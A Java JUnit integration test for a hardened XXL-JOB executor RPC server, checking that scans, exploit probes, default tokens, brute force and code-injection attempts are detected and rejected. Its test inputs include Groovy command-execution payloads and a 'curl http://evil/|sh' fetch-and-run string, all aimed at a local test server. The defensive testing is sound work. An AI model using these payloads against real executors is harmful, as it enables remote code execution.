package com.xxl.job.core.security;

import com.xxl.job.core.constant.Const;
import com.xxl.job.core.executor.XxlJobExecutor;
import com.xxl.job.core.openapi.executor.dto.TriggerRequest;
import com.xxl.job.core.openapi.executor.impl.ExecutorBizImpl;
import com.xxl.job.core.server.EmbedServer;
import com.xxl.tool.json.GsonTool;
import io.netty.bootstrap.ServerBootstrap;
import io.netty.channel.Channel;
import io.netty.channel.ChannelInitializer;
import io.netty.channel.EventLoopGroup;
import io.netty.channel.nio.NioEventLoopGroup;
import io.netty.channel.socket.SocketChannel;
import io.netty.channel.socket.nio.NioServerSocketChannel;
import io.netty.handler.codec.http.HttpObjectAggregator;
import io.netty.handler.codec.http.HttpServerCodec;
import org.junit.jupiter.api.AfterAll;
import org.junit.jupiter.api.BeforeAll;
import org.junit.jupiter.api.Test;

import java.lang.reflect.Field;
import java.net.URI;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.util.concurrent.ThreadPoolExecutor;
import java.util.concurrent.LinkedBlockingQueue;
import java.util.concurrent.TimeUnit;

import static org.junit.jupiter.api.Assertions.*;

/**
 * hardened build: integration test for the executor RPC port (EmbedServer).
 *
 * Boots the real {@link EmbedServer.EmbedHttpServerHandler} on an ephemeral port and fires crafted
 * requests at it, proving:
 *  1) ATTACK DETECTION: scanners, the legacy /run exploit path, the default token, authenticated GLUE
 *     and non-allowlisted handlers each raise the right security event; brute force is detected.
 *  2) "ADMIN-ONLY RPC": every request that is not a correctly-authenticated admin POST is rejected
 *     (fail response) AND flagged, so a non-admin that reaches the port cannot drive the executor.
 *
 * Oracle: {@link SecurityTool#eventCounters()} increments synchronously inside the dispatch, before
 * the HTTP response is written, so a returned response guarantees the event has fired. Deltas are
 * measured per step so other tests sharing the JVM do not matter.
 */
public class EmbedServerDetectionTest {

    private static final String APPNAME = "xxl-job-executor-detection-test";
    private static final String STRONG_TOKEN = "t" + "a1b2c3d4e5f60718293a4b5c6d7e8f90"; // 33 chars, not weak

    private static EventLoopGroup bossGroup;
    private static EventLoopGroup workerGroup;
    private static Channel serverChannel;
    private static int port;
    private static final HttpClient CLIENT = HttpClient.newBuilder().connectTimeout(java.time.Duration.ofSeconds(3)).build();

    @BeforeAll
    static void startServer() throws Exception {
        // configure and install the executor singleton (ExecutorBizImpl resolves it via getInstance())
        XxlJobExecutor executor = new XxlJobExecutor();
        executor.setAppname(APPNAME);
        executor.setAccessToken(STRONG_TOKEN);
        executor.setHandlerAllowlist("demoJobHandler");         // commandJobHandler / httpJobHandler stay denied
        Field instanceField = XxlJobExecutor.class.getDeclaredField("xxlJobExecutor");
        instanceField.setAccessible(true);
        instanceField.set(null, executor);

        bossGroup = new NioEventLoopGroup(1);
        workerGroup = new NioEventLoopGroup();
        ThreadPoolExecutor bizThreadPool = new ThreadPoolExecutor(
                0, 50, 60L, TimeUnit.SECONDS, new LinkedBlockingQueue<>(2000));

        ServerBootstrap bootstrap = new ServerBootstrap();
        bootstrap.group(bossGroup, workerGroup)
                .channel(NioServerSocketChannel.class)
                .childHandler(new ChannelInitializer<SocketChannel>() {
                    @Override
                    protected void initChannel(SocketChannel ch) {
                        ch.pipeline()
                                .addLast(new HttpServerCodec())
                                .addLast(new HttpObjectAggregator(5 * 1024 * 1024))
                                .addLast(new EmbedServer.EmbedHttpServerHandler(new ExecutorBizImpl(), executor, bizThreadPool));
                    }
                });
        serverChannel = bootstrap.bind(0).sync().channel();     // ephemeral port
        port = ((java.net.InetSocketAddress) serverChannel.localAddress()).getPort();
    }

    @AfterAll
    static void stopServer() throws Exception {
        if (serverChannel != null) serverChannel.close().sync();
        if (bossGroup != null) bossGroup.shutdownGracefully();
        if (workerGroup != null) workerGroup.shutdownGracefully();
    }

    private long count(String event) {
        Long v = SecurityTool.eventCounters().get(event);
        return v == null ? 0 : v;
    }

    private HttpResponse<String> get(String path) throws Exception {
        return CLIENT.send(HttpRequest.newBuilder(URI.create("http://127.0.0.1:" + port + path)).GET().build(),
                HttpResponse.BodyHandlers.ofString());
    }

    private HttpResponse<String> post(String path, String token, String appname, String body) throws Exception {
        HttpRequest.Builder b = HttpRequest.newBuilder(URI.create("http://127.0.0.1:" + port + path))
                .POST(HttpRequest.BodyPublishers.ofString(body == null ? "" : body));
        if (token != null) b.header(Const.XXL_JOB_ACCESS_TOKEN, token);
        if (appname != null) b.header(Const.XXL_JOB_APPNAME, appname);
        return CLIENT.send(b.build(), HttpResponse.BodyHandlers.ofString());
    }

    private String trigger(String glueType, String glueSource, String handler, String param) {
        TriggerRequest req = new TriggerRequest();
        req.setJobId(1);
        req.setGlueType(glueType);
        req.setGlueSource(glueSource);
        req.setExecutorHandler(handler);
        req.setExecutorParams(param);
        return GsonTool.toJson(req);
    }

    // ---------------- attack detection ----------------

    @Test
    void httpGetOnRpcPortRaisesScan() throws Exception {
        long before = count("EXECUTOR_SCAN");
        HttpResponse<String> resp = get("/beat");               // a (mis)configured HTTP health probe / scanner
        assertTrue(count("EXECUTOR_SCAN") > before, "GET on the RPC port must raise EXECUTOR_SCAN");
        assertTrue(resp.body().contains("not support") || resp.body().contains("invalid"),
                "GET must be rejected, got: " + resp.body());
    }

    @Test
    void unknownUriRaisesScan() throws Exception {
        long before = count("EXECUTOR_SCAN");
        HttpResponse<String> resp = post("/wp-login.php", null, null, "x");
        assertTrue(count("EXECUTOR_SCAN") > before, "unknown URI must raise EXECUTOR_SCAN");
        assertTrue(resp.body().contains("not found"), "unknown URI must be rejected, got: " + resp.body());
    }

    @Test
    void legacyRunPathRaisesExploitProbe() throws Exception {
        long before = count("EXECUTOR_EXPLOIT_PROBE");
        // the <=2.2 /run API that public unauthenticated GLUE RCE exploits target
        String body = trigger("GLUE_GROOVY", "class A { void run(){ Runtime.getRuntime().exec('id') } }", null, null);
        post("/run", null, null, body);
        assertTrue(count("EXECUTOR_EXPLOIT_PROBE") > before, "POST /run must raise EXECUTOR_EXPLOIT_PROBE");
    }

    @Test
    void defaultTokenRaisesExploitFingerprint() throws Exception {
        long beforeFail = count("EXECUTOR_AUTH_FAIL");
        long beforeExploit = count("EXPLOIT_DEFAULT_TOKEN");
        HttpResponse<String> resp = post("/trigger", "default_token", APPNAME, trigger("BEAN", null, "demoJobHandler", ""));
        assertTrue(count("EXECUTOR_AUTH_FAIL") > beforeFail, "bad token must raise EXECUTOR_AUTH_FAIL");
        assertTrue(count("EXPLOIT_DEFAULT_TOKEN") > beforeExploit, "default_token must raise EXPLOIT_DEFAULT_TOKEN");
        assertTrue(resp.body().contains("invalid"), "default token must be rejected, got: " + resp.body());
    }

    @Test
    void authenticatedGlueIsRejectedAndCaptured() throws Exception {
        long beforeGlue = count("EXECUTOR_GLUE_REJECTED");
        long beforeCapture = count("PAYLOAD_CAPTURED") + count("PAYLOAD_SUSPICIOUS") + count("PAYLOAD_RULE_MATCH");
        String payload = "import java.lang.*; Runtime.getRuntime().exec(\"/bin/sh -c id\")";
        HttpResponse<String> resp = post("/trigger", STRONG_TOKEN, APPNAME, trigger("GLUE_GROOVY", payload, null, null));
        assertTrue(count("EXECUTOR_GLUE_REJECTED") > beforeGlue,
                "authenticated non-BEAN trigger must raise EXECUTOR_GLUE_REJECTED (token/admin compromise signal)");
        assertTrue(count("PAYLOAD_CAPTURED") + count("PAYLOAD_SUSPICIOUS") + count("PAYLOAD_RULE_MATCH") > beforeCapture,
                "the rejected GLUE payload must be captured as evidence");
        assertTrue(resp.body().contains("disabled") || resp.body().contains("BEAN"),
                "GLUE must be rejected, got: " + resp.body());
    }

    @Test
    void nonAllowlistedHandlerIsRejected() throws Exception {
        long before = count("EXECUTOR_HANDLER_REJECTED");
        HttpResponse<String> resp = post("/trigger", STRONG_TOKEN, APPNAME,
                trigger("BEAN", null, "commandJobHandler", "curl http://evil/|sh"));
        assertTrue(count("EXECUTOR_HANDLER_REJECTED") > before,
                "a handler outside the allowlist must raise EXECUTOR_HANDLER_REJECTED");
        assertTrue(resp.body().contains("allowlist"), "handler must be rejected, got: " + resp.body());
    }

    @Test
    void repeatedAuthFailuresRaiseBruteForce() throws Exception {
        long before = count("BRUTE_FORCE_DETECTED");
        for (int i = 0; i < 12; i++) {
            post("/trigger", "wrong-but-long-token-aaaaaaaaaaaaaaaaaa", APPNAME, trigger("BEAN", null, "demoJobHandler", ""));
        }
        assertTrue(count("BRUTE_FORCE_DETECTED") > before,
                "10+ auth failures from one source within the window must raise BRUTE_FORCE_DETECTED");
    }

    // ---------------- admin source-IP allowlist (code-enforced, no k8s needed) ----------------

    @Test
    void sourceIpAllowlistRejectsNonAdminSource() throws Exception {
        XxlJobExecutor exec = XxlJobExecutor.getInstance();
        try {
            exec.setAdminCidrs("10.0.0.0/8");                 // excludes the test client's 127.0.0.1
            long before = count("EXECUTOR_SCAN");
            // even a valid token + appname is rejected because the source IP is not an admin address
            HttpResponse<String> resp = post("/trigger", STRONG_TOKEN, APPNAME, trigger("BEAN", null, "demoJobHandler", ""));
            assertTrue(count("EXECUTOR_SCAN") > before, "a non-admin source must raise EXECUTOR_SCAN");
            assertTrue(resp.body().contains("source not allowed"), "non-admin source must be rejected, got: " + resp.body());
        } finally {
            exec.setAdminCidrs(null);                          // restore not-enforced for the other tests
        }
    }

    @Test
    void sourceIpAllowlistAllowsAdminSource() throws Exception {
        XxlJobExecutor exec = XxlJobExecutor.getInstance();
        try {
            exec.setAdminCidrs("127.0.0.0/8");                 // includes the test client's loopback
            long before = count("EXECUTOR_SCAN");
            HttpResponse<String> resp = post("/trigger", STRONG_TOKEN, APPNAME, trigger("BEAN", null, "demoJobHandler", ""));
            assertEquals(before, count("EXECUTOR_SCAN"), "an admin source must not be flagged as a scan");
            assertFalse(resp.body().contains("source not allowed"), "admin source must pass the gate, got: " + resp.body());
        } finally {
            exec.setAdminCidrs(null);
        }
    }

    // ---------------- admin-only RPC: the happy path is accepted ----------------

    @Test
    void correctlyAuthenticatedBeanTriggerPassesAuthAndDetection() throws Exception {
        long scanBefore = count("EXECUTOR_SCAN");
        long authFailBefore = count("EXECUTOR_AUTH_FAIL");
        long glueBefore = count("EXECUTOR_GLUE_REJECTED");
        long handlerBefore = count("EXECUTOR_HANDLER_REJECTED");
        // valid admin-style call: strong token + matching appname + BEAN + allowlisted handler
        HttpResponse<String> resp = post("/trigger", STRONG_TOKEN, APPNAME, trigger("BEAN", null, "demoJobHandler", ""));
        assertEquals(scanBefore, count("EXECUTOR_SCAN"), "a valid admin call must not look like a scan");
        assertEquals(authFailBefore, count("EXECUTOR_AUTH_FAIL"), "a valid admin call must pass auth");
        assertEquals(glueBefore, count("EXECUTOR_GLUE_REJECTED"), "a BEAN call must not trip the GLUE gate");
        assertEquals(handlerBefore, count("EXECUTOR_HANDLER_REJECTED"), "an allowlisted handler must not be rejected");
        // handler is not actually registered in this harness, so the biz layer fails to find it -> that is expected
        assertNotNull(resp.body());
    }
}
